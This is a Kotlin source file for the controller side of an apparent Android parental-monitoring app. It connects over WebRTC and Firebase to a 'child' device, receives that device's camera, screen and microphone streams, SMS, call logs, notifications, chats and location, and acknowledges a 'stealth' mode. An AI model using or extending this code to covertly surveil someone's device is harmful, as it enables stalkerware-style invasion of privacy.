package nexus.android.parent.webrtc

import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.tasks.await
import org.json.JSONObject

/*
 * ConnectionManager - High-level connection manager
 * Orchestrates WebRTC connection and data channel communication
 * Based on desktop ConnectionManager.js
 */

object ConnectionManager {
    private const val TAG = "ConnectionManager"
    private var context: Context? = null
    private var peerManager: ParentPeerManager? = null
    private var firebaseSignaling: FirebaseSignaling? = null
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    
    // Data channel events flow
    private val _dataChannelEvents = MutableSharedFlow<String>(
        replay = 0,
        extraBufferCapacity = 1024
    )
    val dataChannelEvents: SharedFlow<String> = _dataChannelEvents
    
    // Video track flows
    private val _cameraVideoTrack = MutableSharedFlow<org.webrtc.VideoTrack>(
        replay = 1,
        extraBufferCapacity = 1
    )
    val cameraVideoTrack: SharedFlow<org.webrtc.VideoTrack> = _cameraVideoTrack
    
    private val _screenVideoTrack = MutableSharedFlow<org.webrtc.VideoTrack>(
        replay = 1,
        extraBufferCapacity = 1
    )
    val screenVideoTrack: SharedFlow<org.webrtc.VideoTrack> = _screenVideoTrack
    
    // Audio track flows
    private val _micAudioTrack = MutableSharedFlow<org.webrtc.AudioTrack>(
        replay = 1,
        extraBufferCapacity = 1
    )
    val micAudioTrack: SharedFlow<org.webrtc.AudioTrack> = _micAudioTrack
    
    // Connection state
    private var isConnected = false
    private var currentChildId: String? = null
    
    /**
     * Initialize with context
     */
    fun initialize(ctx: Context) {
        context = ctx
        Log.d(TAG, "✅ ConnectionManager initialized")
    }
    
    /**
     * Connect to child device
     */
    suspend fun connect(childId: String) {
        if (context == null) {
            throw IllegalStateException("ConnectionManager not initialized")
        }
        
        Log.d(TAG, "🔗 Connecting to Child ID: $childId")
        currentChildId = childId
        
        // Validate child ID
        if (!validateChildId(childId)) {
            throw IllegalArgumentException("Child ID must be exactly 12 digits")
        }
        
        // Check child device status
        val status = checkChildStatus(childId)
        val validStatuses = listOf("online", "online-waiting", "connected")
        if (!validStatuses.contains(status)) {
            throw Exception("Child device is $status. Please ensure the child app is running.")
        }
        
        Log.d(TAG, "✅ Child device status: $status")
        
        // Create peer manager
        peerManager = ParentPeerManager(context!!, scope)
        peerManager?.initializePeerConnectionFactory()
        
        // Create peer connection
        val pc = peerManager?.createPeerConnection()
        
        // Setup callbacks
        peerManager?.onConnectionEstablished = { dataChannel ->
            Log.d(TAG, "✅ WebRTC connection established")
            isConnected = true
        }
        
        peerManager?.onStreamReceived = { streamType, stream ->
            Log.d(TAG, "📹 Stream received: $streamType")
            // Emit stream event for features to listen
            scope.launch {
                when (streamType) {
                    "camera" -> {
                        val videoTrack = stream.videoTracks.firstOrNull()
                        if (videoTrack != null) {
                            _cameraVideoTrack.emit(videoTrack)
                            Log.d(TAG, "📹 Camera video track emitted")
                        }
                    }
                    "screen" -> {
                        val videoTrack = stream.videoTracks.firstOrNull()
                        if (videoTrack != null) {
                            _screenVideoTrack.emit(videoTrack)
                            Log.d(TAG, "📹 Screen video track emitted")
                        }
                    }
                    "mic" -> {
                        val audioTrack = stream.audioTracks.firstOrNull()
                        if (audioTrack != null) {
                            _micAudioTrack.emit(audioTrack)
                            Log.d(TAG, "🎤 Mic audio track emitted")
                        }
                    }
                }
            }
        }
        
        // Listen to data channel events
        scope.launch {
            Log.d(TAG, "🎧 Started listening to data channel events")
            peerManager?.dataChannelEvents?.collect { message ->
                Log.d(TAG, "📨 Received message from peerManager flow: $message")
                handleDataChannelMessage(message)
            }
        }
        
        // Setup Firebase signaling
        firebaseSignaling = FirebaseSignaling(childId, peerManager!!, scope)
        firebaseSignaling?.setup()
        
        // Add transceivers
        peerManager?.addVideoTransceiver()
        peerManager?.addAudioTransceiver()
        
        // Create and send offer
        val offer = peerManager?.createOffer()
        offer?.let {
            firebaseSignaling?.sendOffer(it)
        }
        
        Log.d(TAG, "✅ Connection initiated")
    }
    
    /**
     * Validate child ID format
     */
    private fun validateChildId(childId: String): Boolean {
        return childId.length == 12 && childId.all { it.isDigit() }
    }
    
    /**
     * Check child device status
     */
    private suspend fun checkChildStatus(childId: String): String = withContext(Dispatchers.IO) {
        try {
            val database = com.google.firebase.database.FirebaseDatabase.getInstance()
            val childStatusRef = database.getReference("child-devices/$childId/status")
            val snapshot = childStatusRef.get().await()
            val status = snapshot.getValue(String::class.java)
            return@withContext status ?: "offline"
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to check child status: ${e.message}")
            return@withContext "offline"
        }
    }
    
    /**
     * Wait for connection to establish
     */
    suspend fun waitForConnection(maxAttempts: Int = 20): Boolean {
        var attempts = 0
        while (attempts < maxAttempts) {
            if (isConnected) {
                Log.d(TAG, "✅ Connected successfully!")
                return true
            }
            delay(500)
            attempts++
        }
        throw Exception("Connection timeout. Please try again.")
    }
    
    /**
     * Handle data channel message
     */
    private suspend fun handleDataChannelMessage(message: String) {
        Log.d(TAG, "📩 Data channel message: $message")
        
        // Emit to flow for features to listen
        _dataChannelEvents.emit(message)
        
        // Parse and dispatch specific events
        try {
            val json = JSONObject(message)
            val type = json.optString("type")
            
            when (type) {
                "sms" -> {
                    Log.d(TAG, "📨 SMS message received")
                    // Already emitted to flow
                }
                "calllog" -> {
                    Log.d(TAG, "📞 Call log received")
                }
                "NOTIFICATION", "NOTIFICATION_BATCH" -> {
                    Log.d(TAG, "🔔 Notification received")
                }
                "MESSAGE", "TYPING", "APP_FOREGROUND" -> {
                    Log.d(TAG, "💬 Chat message received")
                }
                "location", "LOCATION_UPDATE" -> {
                    Log.d(TAG, "📍 Location update received")
                }
            }
        } catch (e: Exception) {
            // Not JSON, might be confirmation message
            when (message) {
                "SMS_STARTED", "SMS_STOPPED" -> Log.d(TAG, "📨 SMS confirmation: $message")
                "CALLLOG_STARTED", "CALLLOG_STOPPED" -> Log.d(TAG, "📞 Call log confirmation: $message")
                "NOTIFICATION_STARTED", "NOTIFICATION_STOPPED" -> Log.d(TAG, "🔔 Notification confirmation: $message")
                "CHAT_STARTED", "CHAT_STOPPED" -> Log.d(TAG, "💬 Chat confirmation: $message")
                "CAMERA_STARTED", "CAMERA_STOPPED", "CAMERA_SWITCHED" -> Log.d(TAG, "📹 Camera confirmation: $message")
                "MIC_STARTED", "MIC_STOPPED" -> Log.d(TAG, "🎤 Mic confirmation: $message")
                "LOCATION_STARTED", "LOCATION_STOPPED" -> Log.d(TAG, "📍 Location confirmation: $message")
                "STEALTH_ON_ACK", "STEALTH_OFF_ACK" -> Log.d(TAG, "🔒 Stealth confirmation: $message")
            }
        }
    }
    
    /**
     * Send command to child device
     */
    fun sendCommand(command: String): Boolean {
        if (!isConnected) {
            Log.w(TAG, "Cannot send command: Not connected")
            return false
        }
        
        Log.d(TAG, "📤 Sending command: $command")
        return peerManager?.sendCommand(command) ?: false
    }
    
    /**
     * Send binary data to child device
     */
    fun sendBinaryData(data: ByteArray): Boolean {
        if (!isConnected) {
            Log.w(TAG, "Cannot send binary data: Not connected")
            return false
        }
        
        return peerManager?.sendBinaryData(data) ?: false
    }
    
    /**
     * Disconnect from device
     */
    fun disconnect() {
        Log.d(TAG, "🧹 Disconnecting...")
        
        peerManager?.cleanup()
        peerManager = null
        
        firebaseSignaling?.cleanup()
        firebaseSignaling = null
        
        isConnected = false
        currentChildId = null
        
        Log.d(TAG, "✅ Disconnected")
    }
    
    /**
     * Check if connected
     */
    fun isConnected(): Boolean = isConnected
    
    /**
     * Get current child ID
     */
    fun getCurrentChildId(): String? = currentChildId
    
    /**
     * Initialize parent audio (for speaking to child)
     */
    suspend fun initializeParentAudio(): Boolean {
        val success = peerManager?.initializeParentAudio() ?: false
        
        if (success && firebaseSignaling != null && peerManager != null) {
            // Trigger renegotiation to update the connection
            Log.d(TAG, "🔄 Triggering renegotiation after parent audio initialization...")
            try {
                peerManager?.renegotiate(firebaseSignaling!!)
                Log.d(TAG, "✅ Renegotiation triggered successfully")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Renegotiation failed", e)
            }
        }
        
        return success
    }
    
    /**
     * Set parent audio enabled/disabled
     */
    fun setParentAudioEnabled(enabled: Boolean) {
        peerManager?.setParentAudioEnabled(enabled)
    }
}
